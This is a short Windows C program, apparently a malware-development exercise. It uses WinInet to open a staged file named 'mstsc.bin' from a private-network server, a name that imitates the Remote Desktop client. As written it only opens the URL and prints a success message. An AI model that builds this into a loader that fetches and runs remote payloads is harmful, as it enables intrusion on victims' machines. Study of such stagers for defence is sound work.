#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#pragma comment (lib, "Wininet.lib")


BOOL GetFile() {
    // Forward Declaration
    HINTERNET hInternet = NULL;
    HINTERNET hFile = NULL;

    hInternet = InternetOpenW(L"Top Secret User Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to open Internet.\n");
        printf("Error code: %d \n", GetLastError());
        return FALSE;
    }

    hFile = InternetOpenUrlW(hInternet, L"http://172.16.52.129:8000/mstsc.bin", NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hFile == NULL) {
        printf("Failed to open URL.\n");
        InternetCloseHandle(hInternet);
        printf("Error code: %d \n", GetLastError());
        return FALSE;
    }

    // Clean up
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return TRUE;
}

int main() {
    if (GetFile()) {
        printf("[+] Well done\n");
    }
    getchar();
    return 0;
}
